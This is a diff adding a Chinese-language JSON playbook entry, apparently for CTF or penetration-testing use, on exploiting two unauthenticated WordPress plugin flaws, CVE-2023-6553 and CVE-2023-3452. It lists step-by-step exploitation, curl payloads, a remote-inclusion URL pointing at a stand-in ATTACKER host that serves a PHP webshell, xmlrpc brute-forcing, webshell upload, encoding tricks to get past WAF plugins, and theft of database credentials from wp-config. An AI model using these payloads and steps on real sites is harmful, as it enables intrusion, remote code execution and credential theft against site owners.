@@ -1,0 +1,57 @@
+{
+ "id": "web-wordpress-plugin-unauth-rce",
+ "title": "WordPress 插件未授权 RCE 两连:CVE-2023-6553(Backup Migration)与 CVE-2023-3452(Canto RFI)",
+ "vuln_pattern": "WordPress 高危插件未授权 RCE:插件端点无鉴权直接进命令执行/文件包含——指纹 wp-content/plugins/<插件>/ 后按插件抄对应 PoC",
+ "fingerprint": [
+  "wordpress",
+  "WordPress",
+  "wp-content",
+  "wp-json",
+  "Backup Migration",
+  "backup-heart.php",
+  "content-dir",
+  "Canto",
+  "wp_abspath",
+  "插件RCE"
+ ],
+ "exploit_steps": [
+  "指纹:wp-login.php / wp-content / wp-json 确认 WordPress;枚举插件(readme.txt 版本)——/wp-content/plugins/<name>/readme.txt 直接吐版本;wpscan 有就用,没有就 ffuf 常见插件名。",
+  "CVE-2023-6553(Backup Migration ≤1.3.7,未授权 RCE):POST /wp-content/plugins/backup-migration/includes/backup-heart.php,body 参数 content-dir 注入命令——插件把该参数拼进 include/execute 路径;打两层:先 HEAD/探测确认插件在,再发 PoC 读 flag。注意同时存在关联的 local-file-read 变体(同入口不同参数)。",
+  "CVE-2023-3452(Canto ≤3.0.4,未授权 RFI/RCE):GET/POST /wp-content/plugins/canto/includes/lib/download.php?wp_abspath=<远程URL>,后端 require 该路径——allow_url_include=On 时包含自己托管的 webshell(http://me/sh.txt 的 PHP 代码即执行);也试 file:// 读本地文件。",
+  "通用 WP 插件打法:wp-json/wp/v2/users 枚举用户;xmlrpc.php 爆破(有 xmlrpc 时比 wp-login 快且不锁);上传目录 /wp-content/uploads/ 落 webshell 后访问;插件目录 403 时试备份后缀(.bak/.old)与 /wp-content/plugins/<name>/ 直接列目录。",
+  "收割:flag 常在 /flag.txt、/opt/flag.txt、wp-config.php(DB 凭据→mysql 直读 option 表里插件密钥);拿 DB 即拿 admin 密码 hash 改 admin 会话或直接读 flag option。"
+ ],
+ "key_payloads": [
+  "# CVE-2023-6553 Backup Migration 未授权 RCE(示意)\ncurl -X POST 'http://T/wp-content/plugins/backup-migration/includes/backup-heart.php' \\\n  -H 'Content-Type: application/x-www-form-urlencoded' \\\n  --data 'content-dir=/var/www/html/../../../usr/bin/' ; # PoC 以公开 exploit 脚本为准, 参数名不变",
+  "# CVE-2023-3452 Canto RFI\ncurl 'http://T/wp-content/plugins/canto/includes/lib/download.php?wp_abspath=http://ATTACKER/sh.txt'\n# sh.txt: <?php system($_GET[\"c\"]); ?>   (需 allow_url_include=On; 不开则 file:// 读文件)"
+ ],
+ "category": "web",
+ "cve": [
+  "CVE-2023-6553",
+  "CVE-2023-3452"
+ ],
+ "tags": [
+  "wordpress",
+  "plugin-rce",
+  "unauth-rce",
+  "rfi",
+  "backup-migration",
+  "canto",
+  "cve-2023"
+ ],
+ "source": "公开漏洞公告与 PoC 分析(2026-08-20)",
+ "source_tier": "seed",
+ "preconditions": [
+  "目标是 WordPress(wp-login.php/wp-content 指纹)",
+  "枚举到 Backup Migration 或 Canto 插件(或版本未知时直接打两个入口探测)"
+ ],
+ "verify_oracle": "插件入口返回非 404/非标准响应(命令输出/webshell 回显),最终读到 flag 文件内容",
+ "pitfalls": [
+  "先确认插件存在再打(readme.txt 404 ≠ 插件不存在,试主文件 200)",
+  "RFI 需 allow_url_include=On——不开时 Canto 入口转 file:// LFI 读配置",
+  "WP 缓存/安全插件会拦 POST 体里的路径穿越串——编码 ../ 变体(..%2f)再试",
+  "nuclei 有这两个 CVE 的模板(-tags wordpress,cve)——指纹命中 WP 时先 nuclei 一轮再手打"
+ ],
+ "anti_fingerprint": [],
+ "created_ts": 0.0
+}
